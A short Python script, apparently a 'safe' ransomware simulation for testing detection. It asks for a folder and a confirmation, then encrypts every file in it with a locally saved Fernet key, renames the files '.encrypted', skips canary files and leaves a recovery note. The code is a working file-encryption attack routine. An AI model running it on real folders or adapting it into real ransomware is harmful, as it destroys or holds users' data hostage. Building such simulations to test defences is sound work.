# attack_simulator.py - Safe ransomware demo for Windows
import os
import time
from cryptography.fernet import Fernet

KEY_FILE = "simulation_key.key"

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key

def encrypt_file(file_path, fernet):
    try:
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted = fernet.encrypt(data)
        with open(file_path, "wb") as f:
            f.write(encrypted)
        os.rename(file_path, file_path + ".encrypted")
        return True
    except:
        return False

def main():
    target = input("📁 Folder to encrypt (e.g., C:\\Users\\amaan\\Desktop\\test_folder): ")
    if not os.path.exists(target):
        print("Folder not found.")
        return
    confirm = input(f"Encrypt all files in {target}? (yes/no): ")
    if confirm.lower() != "yes":
        return
    
    key = generate_key()
    fernet = Fernet(key)
    print(f"🔑 Key saved to {KEY_FILE}")
    
    for root, dirs, files in os.walk(target):
        for file in files:
            if file.endswith(".encrypted") or file.startswith(".canary_"):
                continue
            file_path = os.path.join(root, file)
            print(f"🔒 Encrypting: {file}")
            encrypt_file(file_path, fernet)
            time.sleep(0.03)
    
    with open(os.path.join(target, "README_RECOVER.txt"), "w") as f:
        f.write("Your files have been encrypted (simulation).")
    print("Attack finished.")

if __name__ == "__main__":
    main()